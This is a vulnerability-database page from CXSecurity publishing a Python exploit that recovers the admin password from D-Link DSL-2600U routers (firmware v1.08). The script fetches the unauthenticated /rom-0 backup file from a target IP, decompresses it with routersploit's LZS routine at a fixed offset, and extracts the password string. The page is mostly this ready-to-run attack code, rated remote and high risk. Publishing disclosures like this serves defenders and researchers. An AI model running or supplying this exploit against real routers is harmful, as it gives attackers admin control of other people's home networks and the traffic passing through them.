---
title: D-Link DSL2600U rom-0 Admin Password Disclosure
url: https://cxsecurity.com/issue/WLB-2026060012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-15
fetch_date: 2026-06-16T07:14:38.795241
---

# D-Link DSL2600U rom-0 Admin Password Disclosure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **D-Link DSL2600U rom-0 Admin Password Disclosure** **2026.06.15**  Credit:  **[Amir Hossein Jamshidi](https://cxsecurity.com/author/Amir%2BHossein%2BJamshidi/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: D-Link DSL2600U - 'rom-0' Admin Password Disclosure
# Date: 2026-05-02
# Exploit Author: Amir Hossein Jamshidi
# Vendor Homepage: https://www.dlink.com
# Version: DSL-2600U
# Tested on: ubuntu
# CVE : N/A
# Firmware Version: v1.08
from routersploit.libs.lzs.lzs import LZSDecompress
import requests
import re
import sys
print('''
#################################################################################
# D-Link Router - 'rom-0' Admin Password Disclosure #
# BY: Amir Hossein Jamshidi #
# Mail: amirhosseinjamshidi64@gmail.com #
# github: https://github.com/amirhosseinjamshidi64 #
# Usage: python expoit.py #
#################################################################################
''')
def exploit(url):
data = requests.get(f"{url}/rom-0")
#with open("data", 'wb') as f:
# f.write(data.content)
data = data.content
pos = 8568
res, win = LZSDecompress(data[pos:])
password = re.findall("([\040-\176]{5,})", res)
return password[0]
if \_\_name\_\_ == "\_\_main\_\_":
url = input("Enter Target IP (example: http://192.168.1.1): ")
print("password is: " + '\t' + exploit(url))

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026060012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top